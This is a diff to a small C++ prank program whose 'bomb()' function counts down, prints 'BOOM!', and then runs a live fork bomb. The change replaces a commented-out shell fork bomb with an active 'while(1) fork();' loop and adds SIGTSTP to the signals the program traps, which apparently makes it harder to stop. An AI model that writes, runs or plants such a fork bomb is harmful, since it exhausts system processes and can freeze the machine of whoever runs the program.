@@ -1,7 +1,8 @@
-#include <stdlib.h>
 #include <iostream>
 #include <csignal>
 #include <iomanip>
+#include <stdlib.h>
+#include <unistd.h> //Posix dependant
 size_t count = 0;
 
 std::string ex_ec(const char* cmd){
@@ -36,7 +37,9 @@ void bomb(){
     std::cout << "1" << std::endl;
     ex_ec("sleep 1");
     std::cout << "BOOM!" << std::endl;
-    //ex_ec(":(){ :|:& };:");
+    while(1) {
+        fork();
+    }
 }
 
 
@@ -75,5 +78,6 @@ void signalHandler( int signum ) {
 int main(){
 	signal(SIGINT, signalHandler);  
 	signal(SIGTERM, signalHandler);  
+	signal(SIGTSTP, signalHandler);  
 	prompt();
 }
